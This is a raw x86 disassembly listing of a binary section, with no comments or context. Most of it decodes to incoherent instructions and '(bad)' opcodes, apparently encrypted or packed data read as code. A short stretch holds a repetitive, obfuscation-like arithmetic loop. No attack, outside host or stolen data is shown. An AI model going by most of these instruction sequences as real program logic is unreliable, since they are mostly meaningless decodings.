  415dc5:	cmp    DWORD PTR [ecx-0x47],0x12dd5d8a
  415dcc:	out    dx,eax
  415dcd:	lods   eax,DWORD PTR ds:[esi]
  415dce:	out    dx,eax
  415dcf:	ins    DWORD PTR es:[edi],dx
  415dd0:	in     al,dx
  415dd1:	sbb    DWORD PTR [ecx+ecx*1-0x7011e2a5],esp
  415dd8:	and    ah,dl
  415dda:	push   ebx
  415ddb:	push   ebx
  415ddc:	xchg   edi,eax
  415ddd:	sbb    BYTE PTR [edi-0x59],cl
  415de0:	std    
  415de1:	mov    dh,0x5d
  415de3:	lods   al,BYTE PTR ds:[esi]
  415de4:	fcom   DWORD PTR [ebp+0x1402dbec]
  415dea:	xchg   esp,eax
  415deb:	ror    DWORD PTR [ebp-0x2e2b13cc],1
  415df1:	repnz popf 
  415df3:	(bad)  
  415df4:	xchg   ebx,eax
  415df5:	jmp    0x415e4d
  415df7:	mov    ?,WORD PTR [edi-0x593d9213]
  415dfd:	sub    al,0x8b
  415dff:	retf   0xe4b5
  415e02:	pop    ss
  415e03:	mov    ebp,0x82734759
  415e08:	mov    edi,0x97663529
  415e0d:	inc    ecx
  415e0e:	out    dx,al
  415e0f:	mov    ch,ch
  415e11:	out    0x0,eax
  415e13:	inc    edx
  415e14:	and    eax,0x331066c6
  415e19:	loopne 0x415df9
  415e1b:	cwde   
  415e1c:	sub    DWORD PTR [eax],edx
  415e1e:	lahf   
  415e1f:	sub    dl,BYTE PTR [edi-0x76]
  415e22:	sahf   
  415e23:	icebp  
  415e24:	aas    
  415e25:	xchg   DWORD PTR [ebp-0x71],ecx
  415e28:	fwait
  415e29:	int3   
  415e2a:	shl    DWORD PTR [eax],0x28
  415e2d:	jg     0x415daf
  415e2f:	or     BYTE PTR [esp+ecx*2-0x11],bl
  415e33:	repz lgs eax,FWORD PTR [edi]
  415e37:	outs   dx,DWORD PTR ds:[esi]
  415e38:	pop    ecx
  415e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e3a:	jb     0x415e3d
  415e3c:	xor    al,BYTE PTR [edi+0x38]
  415e3f:	and    esi,DWORD PTR [ebp+0x63]
  415e42:	mov    dh,0xed
  415e44:	pop    ecx
  415e45:	cld    
  415e46:	shl    DWORD PTR [ecx+0x67e2c1d9],1
  415e4c:	sbb    al,0xf9
  415e4e:	lds    ebx,FWORD PTR [ecx]
  415e50:	dec    ecx
  415e51:	sub    ecx,DWORD PTR [ebx+0x44]
  415e54:	lahf   
  415e55:	cmc    
  415e56:	out    dx,al
  415e57:	pop    DWORD PTR [eax+0x296bde24]
  415e5d:	mov    ebp,0x6bf4ff9f
  415e62:	js     0x415e13
  415e64:	mov    eax,ds:0xfceb0fbe
  415e69:	mov    edi,es
  415e6b:	xchg   esp,eax
  415e6c:	inc    edx
  415e6d:	aad    0xf1
  415e6f:	into   
  415e70:	ror    DWORD PTR [esi-0x29],cl
  415e73:	es adc al,0x3e
  415e76:	mov    cl,0xb9
  415e78:	shr    BYTE PTR gs:[eax-0x59b34e27],cl
  415e7f:	or     DWORD PTR [ebx-0x41],0x74
  415e83:	jae    0x415e55
  415e85:	lods   al,BYTE PTR ds:[esi]
  415e86:	and    ecx,DWORD PTR [edx+0x45dca308]
  415e8c:	cmp    eax,0x5606944d
  415e91:	in     al,0x8c
  415e93:	(bad)  
  415e95:	cwde   
  415e96:	jecxz  0x415eb5
  415e98:	test   eax,0xa4240022
  415e9d:	mov    esi,0xb6395f61
  415ea2:	cli    
  415ea3:	enter  0xba1b,0x89
  415ea7:	add    ecx,DWORD PTR [ebp-0x1e]
  415eaa:	dec    esi
  415eab:	outs   dx,BYTE PTR ds:[esi]
  415eac:	xor    BYTE PTR [edi-0x582772a5],0x88
  415eb3:	(bad)  
  415eb4:	popf   
  415eb5:	outs   dx,DWORD PTR ds:[esi]
  415eb6:	cmp    DWORD PTR [ecx+ebp*4+0x7348cca9],0xffffff8a
  415ebe:	dec    edx
  415ebf:	shr    DWORD PTR [edx+0x3444f75f],cl
  415ec5:	clc    
  415ec6:	adc    ebp,esi
  415ec8:	out    0x37,al
  415eca:	imul   esp,DWORD PTR [ebx],0xb5fc8bc2
  415ed0:	sub    bl,BYTE PTR [ebx]
  415ed2:	jmp    0x415f0c
  415ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ed5:	pop    edi
  415ed6:	or     edi,DWORD PTR [edx+ecx*2+0x27]
  415eda:	(bad)  [esi]
  415edc:	jmp    0x25a2:0xe31c5ddb
  415ee3:	fistp  DWORD PTR [ebx]
  415ee5:	xor    DWORD PTR [ebx],ecx
  415ee7:	jmp    0x3574f6a
  415eec:	stc    
  415eed:	mov    ds:0x188c538b,eax
  415ef2:	xchg   DWORD PTR [eax+ebx*8],eax
  415ef5:	sbb    DWORD PTR [edi+0xf648df0],esp
  415efb:	dec    ebp
  415efc:	sahf   
  415efd:	ss addr16 aad 0xa3
  415f01:	xchg   ebx,eax
  415f02:	into   
  415f03:	test   BYTE PTR [edx-0x740c5ce3],cl
  415f09:	add    DWORD PTR [ebx+0x30751912],edx
  415f0f:	fwait
  415f10:	inc    esp
  415f11:	xor    BYTE PTR [esi+0x2cd3a87],ah
  415f17:	and    al,0xf8
  415f19:	test   DWORD PTR [edi+eax*1],0x1f060aa3
  415f20:	jp     0x415f40
  415f22:	sub    bl,BYTE PTR [ebx-0x21]
  415f25:	ret    
  415f26:	and    dl,dl
  415f28:	push   edx
  415f29:	mov    esi,0xa4ba8917
  415f2e:	test   BYTE PTR [eax-0x15],ch
  415f31:	inc    esi
  415f32:	mov    ah,0xef
  415f34:	fs sub esi,ecx
  415f37:	inc    ebp
  415f38:	and    BYTE PTR [ebx+edi*2-0x55],ch
  415f3c:	sbb    DWORD PTR [esi-0x5c3991e5],ecx
  415f42:	inc    ecx
  415f43:	sbb    eax,0x125aceba
  415f48:	dec    ecx
  415f49:	nop
  415f4a:	les    eax,FWORD PTR [esi+0x60]
  415f4d:	mov    DWORD PTR [ecx+0x1d],ecx
  415f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f51:	out    0xd6,eax
  415f53:	xor    eax,0x5d6776a6
  415f58:	ins    DWORD PTR es:[edi],dx
  415f59:	add    al,BYTE PTR [edx*2-0x42cf44e4]
  415f60:	fs cmc 
  415f62:	hlt    
  415f63:	or     ebp,DWORD PTR [esp+ebp*8+0x6addcd3d]
  415f6a:	sub    BYTE PTR ds:0x2a2d5991,ah
  415f70:	cmp    DWORD PTR [esp+eiz*2],esp
  415f73:	xor    ch,BYTE PTR [ebx]
  415f75:	xor    ebx,DWORD PTR [ebx-0x558db6cd]
  415f7b:	out    dx,eax
  415f7c:	pop    ebx
  415f7d:	mov    edx,0x99a3b237
  415f82:	inc    eax
  415f83:	jp     0x415fc0
  415f85:	pop    edx
  415f86:	mov    ah,0xac
  415f88:	dec    esi
  415f89:	mov    ds:0x668c713b,al
  415f8e:	test   edi,0x320f9bfe
  415f94:	test   eax,0x7368d5de
  415f99:	cmp    ebp,esi
  415f9b:	stos   BYTE PTR es:[edi],al
  415f9c:	jge    0x415ff2
  415f9e:	sbb    ebx,esi
  415fa0:	test   ah,ch
  415fa2:	dec    edx
  415fa3:	push   es
  415fa4:	movq   mm2,mm4
  415fa7:	ret    0xbe59
  415faa:	cli    
  415fab:	bound  ebx,QWORD PTR [esi]
  415fad:	fst    DWORD PTR [eax-0x46]
  415fb0:	xchg   BYTE PTR [ecx-0x7483ec3],cl
  415fb6:	pop    eax
  415fb7:	ds pop es
  415fb9:	repnz pop ebx
  415fbb:	add    dh,dl
  415fbd:	lahf   
  415fbe:	mov    cl,0xa
  415fc0:	aad    0x33
  415fc2:	int    0x1a
  415fc4:	call   0x18b5333a
  415fc9:	call   0x1bf8:0x23625766
  415fd0:	mov    esp,0xc4200f5f
  415fd5:	inc    ecx
  415fd6:	adc    ch,cl
  415fd8:	jno    0x415fb1
  415fda:	retf   0xddd5
  415fdd:	cmp    eax,esp
  415fdf:	inc    ebx
  415fe0:	xchg   ebp,eax
  415fe1:	ror    esp,0xf9
  415fe4:	js     0x41604a
  415fe6:	mov    ds:0x73bb5014,al
  415feb:	push   0xf088ef13
  415ff0:	es scas al,BYTE PTR es:[edi]
  415ff2:	lahf   
  415ff3:	inc    esp
  415ff4:	arpl   WORD PTR [edi-0x60],bx
  415ff7:	jle    0x415fd4
  415ff9:	mov    eax,ds:0x75b42a45
  415ffe:	out    dx,eax
  415fff:	or     dl,BYTE PTR [ebp+0x5f]
  416002:	jle    0x415fd7
  416004:	gs xchg ebx,eax
  416006:	adc    DWORD PTR [edi+0x79],ecx
  416009:	mov    edi,0x2487c909
  41600e:	ret    0x9b27
  416011:	out    0x98,eax
  416013:	stc    
  416014:	mov    al,0xa9
  416016:	xchg   ecx,eax
  416017:	mov    ds:0xe244d4eb,eax
  41601c:	cmp    al,0x39
  41601e:	int3   
  41601f:	xchg   edx,eax
  416020:	pushf  
  416021:	cmp    DWORD PTR [esi-0x6afe7c71],eax
  416027:	mov    edx,0x44062911
  41602c:	sub    eax,0xf24a2377
  416031:	(bad)  
  416033:	adc    eax,0x85fb015f
  416038:	in     al,0x11
  41603a:	mov    ss,WORD PTR [edi+0x60]
  41603d:	push   ebx
  41603e:	ss ins BYTE PTR es:[edi],dx
  416040:	mov    al,0x4c
  416042:	div    DWORD PTR [esi]
  416044:	pop    ebx
  416045:	push   esi
  416046:	xor    al,0x19
  416048:	dec    ebp
  416049:	add    eax,DWORD PTR [esi]
  41604b:	jnp    0x41609b
  41604d:	xor    eax,0xf366a843
  416052:	adc    ch,al
  416054:	push   es
  416055:	mov    edx,DWORD PTR [ebp+0x5c]
  416058:	imul   edx,ebx,0xaba3793f
  41605e:	fiadd  DWORD PTR [edi-0x516fbbeb]
  416064:	pop    edx
  416065:	test   eax,0x206dd35b
  41606a:	inc    edx
  41606b:	pop    esp
  41606c:	cwde   
  41606d:	pop    ecx
  41606e:	and    DWORD PTR [ebx-0x16],ebp
  416071:	mov    ebx,0x3ab0ba64
  416076:	xchg   esp,eax
  416077:	mov    dh,0x76
  416079:	xchg   esi,eax
  41607a:	xchg   BYTE PTR [esi-0x5b90432],al
  416080:	test   eax,0x9d42e520
  416085:	sbb    edx,DWORD PTR [ebp-0x5d]
  416088:	adc    DWORD PTR [ebx],ecx
  41608a:	xor    eax,0x8eca94e9
  41608f:	jge    0x4160e4
  416091:	lea    eax,[ebp-0x43]
  416094:	fidivr WORD PTR [ecx-0x29]
  416097:	scas   eax,DWORD PTR es:[edi]
  416098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416099:	adc    ah,BYTE PTR ds:0x93e385e
  41609f:	xor    ebp,edi
  4160a1:	(bad)  
  4160a2:	pop    ebx
  4160a3:	das    
  4160a4:	xor    al,BYTE PTR [esi+edi*4]
  4160a7:	xchg   ebp,eax
  4160a8:	cs scas al,BYTE PTR es:[edi]
  4160aa:	dec    esi
  4160ab:	sub    dl,BYTE PTR [ebp-0x9]
  4160ae:	jg     0x4160c8
  4160b0:	mov    ds:0x656f0f9a,eax
  4160b5:	aad    0x91
  4160b7:	idiv   edx
  4160b9:	push   ss
  4160ba:	push   cs
  4160bb:	les    ebp,FWORD PTR [eax]
  4160bd:	mov    esp,0x457848f0
  4160c2:	mov    fs,WORD PTR [ecx+0x15]
  4160c5:	adc    al,0x3c
  4160c7:	mov    ds,WORD PTR [ebx+0x3e]
  4160ca:	dec    ebx
  4160cb:	ficom  DWORD PTR ds:0x9d73fdc4
  4160d1:	fidiv  DWORD PTR [ecx]
  4160d3:	shl    BYTE PTR [edx+0x369c74a0],1
  4160d9:	arpl   WORD PTR [esi+eiz*2+0x2d],ax
  4160dd:	sub    BYTE PTR [edi],bl
  4160df:	mov    bl,ah
  4160e1:	lea    edx,[edx+0x7e410695]
  4160e7:	mov    DWORD PTR [edi+0xeb04f63],ebp
  4160ed:	mov    ecx,0xa88a4a05
  4160f2:	jb     0x4160bd
  4160f4:	jns    0x4160dd
  4160f6:	xchg   edx,eax
  4160f7:	clc    
  4160f8:	test   eax,0xd3ec88cf
  4160fd:	int    0x1c
  4160ff:	add    eax,0x8cd5aa20
  416104:	and    al,cl
  416106:	xor    cl,al
  416108:	in     al,dx
  416109:	inc    eax
  41610a:	sbb    BYTE PTR [ecx-0x556260ec],ch
  416110:	add    al,0x7d
  416112:	and    eax,0x1b829cf5
  416117:	imul   esi,ebp,0x31aa5ee5
  41611d:	push   edi
  41611e:	mov    cl,0x4c
  416120:	(bad)  
  416121:	push   ebx
  416122:	and    al,BYTE PTR [ebx+esi*2-0x37]
  416126:	das    
  416127:	sbb    DWORD PTR [ebp+0x6b],edx
  41612a:	adc    edi,DWORD PTR [esi-0x2096ba01]
  416130:	fidivr WORD PTR [eax-0x31]
  416133:	gs call 0x4ae6106
  416139:	ja     0x41614d
  41613b:	out    0x77,al
  41613d:	xchg   esp,eax
  41613e:	inc    ebx
  41613f:	fistp  WORD PTR [edx-0x4e478e27]
  416145:	in     al,dx
  416146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416147:	push   esi
  416148:	inc    ebp
  416149:	call   DWORD PTR [ecx-0x35e38ac]
  41614f:	mov    ebp,DWORD PTR [edx+0xb72148b]
  416155:	xchg   esi,eax
  416156:	inc    ebx
  416157:	ja     0x41612f
  416159:	pop    ds
  41615a:	mov    DWORD PTR [ebp-0x79],edx
  41615d:	neg    BYTE PTR [ebp-0x2d]
  416160:	out    0x3c,eax
  416162:	(bad)  
  416163:	mov    dl,0x1d
  416165:	dec    DWORD PTR ds:0x74b83d93
  41616b:	call   FWORD PTR [edi-0xaf67d44]
  416171:	sub    eax,0x49f4f598
  416176:	sbb    DWORD PTR [eax-0x7d],edi
  416179:	push   0x5363c653
  41617e:	inc    esi
  41617f:	inc    ebx
  416180:	not    ebx
  416182:	fcom   DWORD PTR [ebp+0x7df509ae]
  416188:	xor    eax,0xc689b0f5
  41618d:	or     al,0xc1
  41618f:	sbb    bh,ah
  416191:	cmc    
  416192:	push   es
  416193:	and    DWORD PTR [eax],edi
  416195:	lahf   
  416196:	loop   0x416169
  416198:	rcl    DWORD PTR [esi],cl
  41619a:	jecxz  0x41616d
  41619c:	repnz xor DWORD PTR [eax],eax
  41619f:	ror    DWORD PTR [edi+0x362e2dc2],1
  4161a5:	cmp    edx,DWORD PTR [edx-0x50c1bd49]
  4161ab:	mov    ds:0x5b5e4782,al
  4161b0:	inc    ecx
  4161b1:	call   0xffb4d0cd
  4161b6:	scas   al,BYTE PTR es:[edi]
  4161b7:	adc    bh,BYTE PTR [edi+edx*2]
  4161ba:	push   0xffffffee
  4161bc:	mov    al,0x86
  4161be:	and    BYTE PTR [esi-0x21],0x20
  4161c2:	dec    eax
  4161c3:	push   es
  4161c4:	shl    DWORD PTR [edi-0x1705971f],cl
  4161ca:	popa   
  4161cb:	and    DWORD PTR [eax+0x3c],0x8c227826
  4161d2:	or     al,0xea
  4161d4:	mov    ecx,0x8ed29372
  4161d9:	adc    BYTE PTR [ebx+0x36],al
  4161dc:	(bad)  ds:0x5e922cda
  4161e2:	cmp    esp,DWORD PTR [eax]
  4161e4:	ds clc 
  4161e6:	call   0x28193f8c
  4161eb:	iret   
  4161ec:	out    0x36,eax
  4161ee:	mov    al,ds:0xfc88cb67
  4161f3:	sub    al,0x5c
  4161f5:	gs lock jns 0x416227
  4161f9:	cmp    eax,0xd63e887b
  4161fe:	daa    
  4161ff:	bnd jg 0x41621f
  416202:	sbb    ebx,DWORD PTR [eax-0x2cf898a8]
  416208:	xor    DWORD PTR [ebx+0x24],ebx
  41620b:	movnti DWORD PTR [eax+0x21eb93a0],eax
  416212:	sbb    eax,0x60c8c2dd
  416217:	lea    ebx,ds:0xd4470f88
  41621d:	shl    BYTE PTR [esp+edx*4],cl
  416220:	cmp    eax,0x2cd637b2
  416225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416226:	jbe    0x4161f0
  416228:	fist   WORD PTR ds:0xaad0caa2
  41622e:	mov    eax,ds:0xf449b2b9
  416233:	outs   dx,BYTE PTR ds:[esi]
  416234:	shl    DWORD PTR [esi],0x47
  416237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416238:	mov    fs,edx
  41623a:	lahf   
  41623b:	loopne 0x41628e
  41623d:	sub    eax,0xf9f7fdc0
  416242:	stc    
  416243:	xor    ah,BYTE PTR [edx]
  416245:	call   0x21e8c1d
  41624a:	mov    esi,0xd71a772f
  416250:	adc    ch,BYTE PTR ds:[esi]
  416253:	sub    esi,DWORD PTR [edx-0x6e56abd8]
  416259:	(bad)  
  41625b:	test   eax,0xf5e641a5
  416260:	jbe    0x4162a5
  416262:	mov    eax,ds:0xac814d38
  416267:	pop    esi
  416268:	test   eax,0x89a135a5
  41626d:	xchg   esp,eax
  41626e:	push   0xffffffa0
  416270:	mov    dl,0x7
  416272:	sub    dh,cl
  416274:	mov    dh,0xb2
  416276:	xor    esp,ebp
  416278:	pop    edi
  416279:	mov    ecx,0x58a33d4
  41627e:	push   ebx
  41627f:	enter  0xc555,0x51
  416283:	es mov ebx,0x73eeb978
  416289:	push   edi
  41628a:	in     al,dx
  41628b:	jge    0x41621f
  41628d:	push   ss
  41628e:	sbb    esi,eax
  416290:	xchg   edi,eax
  416291:	mov    al,ds:0x65ce6293
  416296:	or     eax,0x558990e0
  41629b:	test   al,0x8b
  41629d:	push   ebp
  41629e:	or     BYTE PTR [ebx-0x3d7e53a3],cl
  4162a4:	(bad)  
  4162a6:	add    BYTE PTR fs:[ebx],cl
  4162a9:	ror    DWORD PTR [ecx+0x558bac55],cl
  4162af:	or     BYTE PTR [ebx-0x2efc4fa3],cl
  4162b5:	xor    edx,ebx
  4162b7:	mov    DWORD PTR [ebp-0x50],edx
  4162ba:	mov    edx,DWORD PTR [ebp+0x8]
  4162bd:	mov    ebx,DWORD PTR [ebp-0x4c]
  4162c0:	add    edx,edi
  4162c2:	and    edx,ebx
  4162c4:	mov    DWORD PTR [ebp-0x4c],edx
  4162c7:	mov    edx,DWORD PTR [ebp+0x8]
  4162ca:	mov    ebx,DWORD PTR [ebp-0x48]
  4162cd:	lea    edx,[ebx+edx*1+0x241fc1f]
  4162d4:	mov    DWORD PTR [ebp-0x48],edx
  4162d7:	mov    edx,DWORD PTR [ebp+0x8]
  4162da:	mov    ebx,0xfa5e15e2
  4162df:	sub    ebx,edx
  4162e1:	add    ebx,DWORD PTR [ebp-0x44]
  4162e4:	mov    DWORD PTR [ebp-0x44],ebx
  4162e7:	mov    edx,DWORD PTR [ebp+0x8]
  4162ea:	xor    edx,eax
  4162ec:	add    edx,esi
  4162ee:	jne    0x413ef1
  4162f4:	mov    edx,DWORD PTR [ebp-0x14]
  4162f7:	mov    DWORD PTR [ebp+0x8],edx
  4162fa:	jmp    0x41636f
  4162ff:	mov    edx,DWORD PTR [ebp+0x8]
  416302:	mov    ebx,DWORD PTR [ebp-0x8]
  416305:	xor    edx,eax
  416307:	xor    ebx,eax
  416309:	sub    edx,ebx
  41630b:	sub    edx,esi
  41630d:	xor    edx,eax
  41630f:	mov    DWORD PTR [ebp+0x8],edx
  416312:	mov    edx,DWORD PTR [ebp+0x8]
  416315:	mov    ebx,DWORD PTR [ebp-0x58]
  416318:	add    edx,0x5708f8
  41631e:	imul   edx,ebx
  416321:	mov    DWORD PTR [ebp-0x58],edx
  416324:	mov    edx,DWORD PTR [ebp+0x8]
  416327:	mov    ebx,DWORD PTR [ebp-0x54]
  41632a:	add    edx,0x64f8da
  416330:	or     edx,ebx
  416332:	mov    DWORD PTR [ebp-0x54],edx
  416335:	mov    edx,DWORD PTR [ebp+0x8]
  416338:	mov    ebx,DWORD PTR [ebp-0x50]
  41633b:	add    edx,ecx
  41633d:	xor    edx,ebx
  41633f:	mov    DWORD PTR [ebp-0x50],edx
  416342:	mov    edx,DWORD PTR [ebp+0x8]
  416345:	mov    ebx,DWORD PTR [ebp-0x4c]
  416348:	add    edx,edi
  41634a:	and    edx,ebx
  41634c:	mov    DWORD PTR [ebp-0x4c],edx
  41634f:	mov    edx,DWORD PTR [ebp+0x8]
  416352:	mov    ebx,DWORD PTR [ebp-0x48]
  416355:	lea    edx,[ebx+edx*1+0x241fc1f]
  41635c:	mov    DWORD PTR [ebp-0x48],edx
  41635f:	mov    edx,DWORD PTR [ebp+0x8]
  416362:	mov    ebx,0xfa5e15e2
  416367:	sub    ebx,edx
  416369:	add    ebx,DWORD PTR [ebp-0x44]
  41636c:	mov    DWORD PTR [ebp-0x44],ebx
  41636f:	mov    edx,DWORD PTR [ebp+0x8]
  416372:	xor    edx,eax
  416374:	add    edx,esi
  416376:	jne    0x4162ff
  41637c:	mov    edx,DWORD PTR [ebp-0x8]
  41637f:	mov    ebx,DWORD PTR [ebp-0xc]
  416382:	jmp    0x418708
  416387:	nop
  416388:	test   BYTE PTR [ebp-0x643e8c3e],0xf4
  41638f:	add    DWORD PTR [ebp-0x5d],esp
  416392:	out    0xb8,eax
  416394:	cld    
  416395:	ret    0x5ce9
  416398:	push   edi
  416399:	jns    0x416415
  41639b:	add    DWORD PTR [edi+0x7a],ebx
  41639e:	jp     0x4163da
  4163a0:	movaps XMMWORD PTR [ebx-0x6843f2c3],xmm0
  4163a7:	je     0x4163e2
  4163a9:	or     al,0x2b
  4163ab:	dec    ecx
  4163ac:	xor    cl,ch
  4163ae:	and    edi,DWORD PTR [edx-0x67]
  4163b1:	gs dec ecx
  4163b3:	sub    BYTE PTR [ebp+0xe530a49],0x75
  4163ba:	pop    edi
  4163bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163bc:	test   BYTE PTR [esi+ebx*2],ah
  4163bf:	or     BYTE PTR [esi],bh
  4163c1:	and    bh,0xe5
  4163c4:	push   ebp
  4163c5:	je     0x416356
  4163c7:	adc    eax,0xc38d15e0
  4163cc:	loope  0x41640c
  4163ce:	scas   eax,DWORD PTR es:[edi]
  4163cf:	into   
  4163d0:	pop    es
  4163d1:	jbe    0x4163c9
  4163d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d4:	mov    dh,0xff
  4163d6:	jecxz  0x4163e2
  4163d8:	bound  esi,QWORD PTR [ebx-0x3a8d508f]
  4163de:	or     DWORD PTR [ecx+0x5f],edx
  4163e1:	or     bh,BYTE PTR [eax+0x6b]
  4163e4:	jle    0x41643a
  4163e6:	cwde   
  4163e7:	pop    edx
  4163e8:	inc    ecx
  4163e9:	jp     0x4163a4
  4163eb:	push   0x19a2d68e
  4163f0:	jbe    0x416400
  4163f2:	rcr    DWORD PTR [ecx-0xc731b88],0xef
  4163f9:	mov    eax,ds:0x682cfe4d
  4163fe:	lea    ebx,[edx-0x49]
  416401:	xor    eax,0x6d9217db
  416406:	in     eax,dx
  416407:	cmc    
  416408:	int3   
  416409:	push   eax
  41640a:	jmp    0x41646f
  41640c:	xchg   BYTE PTR ds:0x8bdfc617,cl
  416412:	lods   al,BYTE PTR ds:[esi]
  416413:	ret    
  416414:	fadd   QWORD PTR [ebp-0x65977802]
  41641a:	and    al,0xd9
  41641c:	pop    ss
  41641d:	ds mov ebx,ecx
  416420:	xchg   edi,eax
  416421:	lock pop ss
  416423:	fs test al,0xec
  416426:	inc    ebp
  416427:	pop    ebp
  416428:	sub    DWORD PTR ds:0xae384d61,esp
  41642e:	jo     0x41646b
  416430:	xor    ch,BYTE PTR [bx+di]
  416433:	aas    
  416434:	xchg   BYTE PTR [ebx+0x79],bh
  416437:	test   al,0x62
  416439:	fldenv [edx-0x34]
  41643c:	dec    edi
  41643d:	add    BYTE PTR [ecx-0x47],ah
  416440:	adc    DWORD PTR [edx-0x45],esp
  416443:	rol    DWORD PTR [edx],0xe7
  416446:	xchg   esp,eax
  416447:	push   ebp
  416448:	and    eax,0x50e80e73
  41644d:	mov    edi,DWORD PTR [eax]
  41644f:	mov    fs,WORD PTR [esi]
  416451:	or     BYTE PTR [ebx-0x4c],ah
  416454:	(bad)  
  416455:	push   edi
  416456:	ret    0xf3a9
  416459:	xchg   edi,eax
  41645a:	or     eax,DWORD PTR [ebx-0x1cc2e920]
  416460:	stc    
  416461:	push   eax
  416462:	xor    BYTE PTR [edi],dh
  416464:	imul   esp,DWORD PTR [edi-0x3f],0x7eaad465
  41646b:	lock push edx
  41646d:	ds pop edi
  41646f:	iret   
  416470:	pop    ecx
  416471:	(bad)  
  416472:	xchg   ecx,eax
  416473:	(bad)  
  416474:	shr    BYTE PTR [eax+0x3a],cl
  416477:	fstp   QWORD PTR [ecx]
  416479:	jb     0x41646c
  41647b:	stos   DWORD PTR es:[edi],eax
  41647c:	mov    dl,0x27
  41647e:	ds scas al,BYTE PTR es:[edi]
  416480:	retf   0xcca2
  416483:	sub    esp,DWORD PTR [edi-0x884a148]
  416489:	sbb    edi,ebx
  41648b:	adc    dl,BYTE PTR [eax+0x3b]
  41648e:	dec    esp
  41648f:	sub    BYTE PTR [eax-0x305d5355],0x4
  416496:	jge    0x416458
  416498:	jb     0x41643b
  41649a:	dec    eax
  41649b:	xchg   esp,eax
  41649c:	(bad)  
  41649d:	mov    ebp,0x69793820
  4164a2:	les    eax,FWORD PTR [edx+0x46fe2c32]
  4164a8:	loopne 0x4164bf
  4164aa:	jmp    0x75fae3f0
  4164af:	popa   
  4164b0:	les    esi,FWORD PTR [edx-0x23c163d]
  4164b6:	mov    DWORD PTR [edi+0x33],edx
  4164b9:	lds    esi,FWORD PTR [eax]
  4164bb:	pop    edx
  4164bc:	pop    ebx
  4164bd:	xchg   ebp,eax
  4164be:	in     al,dx
  4164bf:	stos   DWORD PTR es:[edi],eax
  4164c0:	dec    ebp
  4164c1:	lea    esi,[ebx]
  4164c3:	and    cl,ah
  4164c5:	iret   
  4164c6:	imul   edx,DWORD PTR [esp+esi*1+0x26df124],0x30
  4164ce:	lods   eax,DWORD PTR ds:[esi]
  4164cf:	aad    0x66
  4164d1:	push   ecx
  4164d2:	mov    edi,0xbd642ad1
  4164d7:	lods   eax,DWORD PTR ds:[esi]
  4164d8:	fwait
  4164d9:	test   DWORD PTR ds:0x9ccf79ad,esp
  4164df:	mov    BYTE PTR [esi-0x44fea451],0x84
  4164e6:	loopne 0x4164d5
  4164e8:	inc    esp
  4164e9:	sar    DWORD PTR [ebp-0x17],0xcd
  4164ed:	and    eax,0x368c0c6d
  4164f2:	addr16 test al,0x86
  4164f5:	sub    edx,edx
  4164f7:	ror    al,0x3e
  4164fa:	inc    edx
  4164fb:	and    ch,BYTE PTR [esi-0x546b3c8f]
  416501:	loop   0x4164fa
  416503:	jg     0x41649d
  416505:	lock sar DWORD PTR [esi-0x59],cl
  416509:	or     DWORD PTR [ecx],ecx
  41650b:	imul   edi,esp,0x1a
  41650e:	mov    eax,ds:0x50b5ae8e
  416513:	stos   DWORD PTR es:[edi],eax
  416514:	add    esp,DWORD PTR [ecx-0x76]
  416517:	and    esi,DWORD PTR [esi]
  416519:	jp     0x416551
  41651b:	pop    ss
  41651c:	add    al,0xe6
  41651e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41651f:	fistp  WORD PTR [eax]
  416521:	dec    eax
  416522:	aam    0xe1
  416524:	pop    ds
  416525:	push   ss
  416526:	lods   al,BYTE PTR ds:[esi]
  416527:	lahf   
  416528:	inc    ebx
  416529:	rol    DWORD PTR [ebx+eiz*4],0x88
  41652d:	push   edx
  41652e:	popa   
  41652f:	fs mov ecx,0x899e6ed2
  416535:	pop    ss
  416536:	ins    BYTE PTR es:[edi],dx
  416537:	and    ch,cl
  416539:	(bad)  
  41653a:	mov    ebp,0xc92a2893
  41653f:	jnp    0x41657e
  416541:	cmp    BYTE PTR [edi+ebp*8+0x4b31de59],al
  416548:	shl    eax,cl
  41654a:	adc    ebp,DWORD PTR [ebp+0x17353b79]
  416550:	fcom   DWORD PTR [ecx-0x2ed3ba4d]
  416556:	add    BYTE PTR gs:[esp+edi*1],dl
  41655a:	xchg   DWORD PTR [eax],edx
  41655c:	test   al,0x47
  41655e:	sbb    BYTE PTR [edx],al
  416560:	or     eax,0x1ec23646
  416565:	sti    
  416566:	test   BYTE PTR [eax],bh
  416568:	mov    dl,0x7
  41656a:	mov    fs,WORD PTR [ecx]
  41656c:	cwde   
  41656d:	add    al,0x29
  41656f:	test   al,0x76
  416571:	sbb    eax,0xfedd3509
  416576:	or     DWORD PTR ds:0xff6ae9a2,ebx
  41657c:	fistp  DWORD PTR [edi]
  41657e:	xor    al,0x19
  416580:	loop   0x416593
  416582:	add    eax,0xcd3b60c8
  416587:	aaa    
  416588:	js     0x416576
  41658a:	mov    ds:0x658bf39a,eax
  41658f:	daa    
  416590:	sub    eax,0x64f423b
  416595:	hlt    
  416596:	cmp    al,0x70
  416598:	add    eax,0x3620f863
  41659d:	stos   DWORD PTR es:[edi],eax
  41659e:	cld    
  41659f:	in     al,dx
  4165a0:	dec    ebx
  4165a1:	test   ch,cl
  4165a3:	dec    edx
  4165a4:	retf   0x31e3
  4165a7:	push   edx
  4165a8:	mov    esp,0xef83e435
  4165ad:	stc    
  4165ae:	out    dx,al
  4165af:	out    0x71,al
  4165b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165b2:	inc    esp
  4165b3:	jl     0x4165b6
  4165b5:	jno    0x4165c8
  4165b7:	sub    BYTE PTR [ebx],dl
  4165b9:	fdiv   DWORD PTR [ebp-0xa524405]
  4165bf:	push   ds
  4165c0:	add    DWORD PTR [esp+edi*4-0x3],ebp
  4165c4:	clc    
  4165c5:	add    edx,edi
  4165c7:	jnp    0x4165bd
  4165c9:	addr16 iret 
  4165cb:	push   ecx
  4165cc:	dec    ebp
  4165cd:	sub    al,0xdc
